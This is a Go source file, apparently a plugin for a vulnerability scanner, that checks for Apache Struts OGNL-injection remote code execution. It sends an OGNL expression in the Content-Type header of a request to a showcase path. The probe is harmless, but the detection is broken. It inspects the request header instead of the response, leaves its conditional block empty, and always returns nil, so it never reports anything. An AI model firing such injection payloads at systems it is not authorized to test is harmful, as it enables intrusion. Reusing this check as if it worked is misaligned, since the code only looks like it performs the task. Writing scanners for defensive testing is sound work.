package plugins

import (
	"DORM/models"
	"net/http"
	"strings"
)

// 76. APACHE STRUTS RCE (OGNL Injection)
type StrutsPlugin struct{}

func (p *StrutsPlugin) Name() string { return "Apache Struts RCE" }

func (p *StrutsPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	client := models.GetClient()
	req, _ := http.NewRequest("GET", getURL(target, "/struts2-showcase/"), nil)
	payload := "%{(#_='=').(#t=@java.lang.System@currentTimeMillis()).(#t)}"
	req.Header.Set("Content-Type", payload)
	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 500 && strings.Contains(req.Header.Get("Content-Type"), "html") {

		}
	}
	return nil
}
